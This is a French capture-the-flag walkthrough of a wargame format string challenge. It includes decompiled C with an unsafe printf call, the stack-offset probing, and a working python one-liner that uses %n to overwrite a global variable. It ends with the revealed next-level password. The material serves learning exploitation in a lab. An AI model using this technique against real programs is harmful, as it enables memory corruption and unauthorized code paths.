# Niveau 4: Exploitation de Format String

## Aperçu du Défi

Le niveau 4 présente une vulnérabilité de type format string. Dans ce défi, nous devons écrire une valeur spécifique (0x1025544) dans une variable globale pour révéler le mot de passe du niveau suivant.

## Analyse du Code Source

En utilisant Ghidra, on obtient un code source du binaire qui ressemble à ceci:

```c
#include <stdio.h>
#include <stdlib.h>

// Variable globale à l'adresse 0x08049810
int target_value = 0;

void print_string(char *user_input)
{
  printf(user_input);
  return;
}

void get_user_input(void)
{
  char buffer[520];

  fgets(buffer, 0x200, stdin);
  print_string(buffer);
  if (target_value == 0x1025544) {
    system("/bin/cat /home/user/level5/.pass");
  }
  return;
}

int main(void)
{
  get_user_input();
  return 0;
}
```

## La Vulnérabilité

La vulnérabilité se trouve dans la fonction `print_string()` qui passe directement l'entrée utilisateur à `printf()` sans spécificateurs de format. Cela crée une vulnérabilité de format string qui nous permet de lire et d'écrire en mémoire.

## La Stratégie d'Exploitation

### 1. Trouver l'Adresse Cible

Tout d'abord, nous devons déterminer l'adresse mémoire de la variable globale `target_value`:

- Grâce à l'analyse Ghidra, nous l'avons identifiée à l'adresse 0x08049810

### 2. Localisation des Positions des Paramètres

Nous devons déterminer où notre adresse sera positionnée dans la liste des paramètres de printf:

```bash
(python -c 'print "\x10\x98\x04\x08" + "%p %p %p %p %p %p %p %p %p %p %p %p"') | ./level4
```

Sortie:

```
0xb7ff26b0 0xbffff684 0xb7fd0ff4 (nil) (nil) 0xbffff648 0x804848d 0xbffff440 0x200 0xb7fd1ac0 0xb7ff37d0 0x8049810
```

Cela montre que notre adresse cible se trouve en position 12.

### 3. Approche d'Écriture Directe

Nous allons utiliser la vulnérabilité de format string pour:

1. Placer l'adresse cible au début de notre entrée
2. Utiliser la fonctionnalité d'accès direct aux paramètres (`%n$`) pour faire écrire printf à cette adresse
3. Imprimer exactement 16 930 116 caractères (équivalent décimal de 0x1025544) avant l'opération d'écriture

Le spécificateur de format `%n` écrit le nombre de caractères imprimés jusqu'à présent à l'adresse spécifiée par l'argument correspondant.

### 4. L'Exploit Complet

```bash
(python -c 'print "\x10\x98\x04\x08" + "%16930112c%12$n"') | ./level4
```

Cette commande:

1. Place l'adresse (0x08049810) au début de notre entrée
2. Utilise `%16930112c` pour imprimer exactement 16 930 112 caractères
3. Les 4 octets de notre adresse au début ajoutent 4 caractères supplémentaires, portant le total à 16 930 116
4. Enfin, `%12$n` écrit ce compteur (16 930 116 = 0x1025544) à la 12ème position, qui est notre adresse cible

Lorsque cet exploit s'exécute avec succès, la condition `target_value == 0x1025544` devient vraie, et nous obtenons le mot de passe pour le niveau 5:

```
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
